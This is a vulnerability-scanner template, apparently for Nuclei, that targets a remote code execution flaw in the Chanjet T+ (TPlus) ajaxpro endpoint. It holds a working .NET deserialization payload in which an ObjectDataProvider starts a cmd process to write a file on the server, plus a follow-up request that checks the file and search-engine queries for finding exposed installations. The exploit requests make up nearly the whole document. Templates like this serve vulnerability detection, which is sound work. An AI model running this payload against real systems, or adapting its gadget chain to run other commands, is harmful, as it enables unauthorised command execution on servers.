id: changjet-tplus-ajaxpro-rce
info:
  name: 畅捷通 TPlus ajaxpro - rce
  author: leadlife
  severity: critical
  description: 
  reference: 
    - https://blog.csdn.net/weixin_41924764/article/details/139729080
  metadata:
    verified: true
    fofa-query: icon_hash="-2067519629" || app="畅捷通-TPlus"
    hunter-query: app.name="畅捷通 T+"
  tags: fileupload,changjet,tplus,rce

variables:
  num: '{{rand_int(800000000, 1000000000)}}'

http:
  - raw:
      - |
        POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
        Accept-Encoding: gzip, deflate
        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
        Connection: close
        Host: {{Hostname}}
        X-Ajaxpro-Method: GetStoreWarehouseByStore
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 570

        {
          "storeID":{
            "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
            "MethodName":"Start",
            "ObjectInstance":{
              "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
              "StartInfo":{
                "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
                "FileName":"cmd",
                "Arguments":"/c echo {{randstr}} > {{num}}.txt"
              }
            }
          }
        }

      - |
        GET /tplus/{{num}}.txt HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && status_code_2 == 200
          - contains(body_2,'{{randstr}}')
        condition: and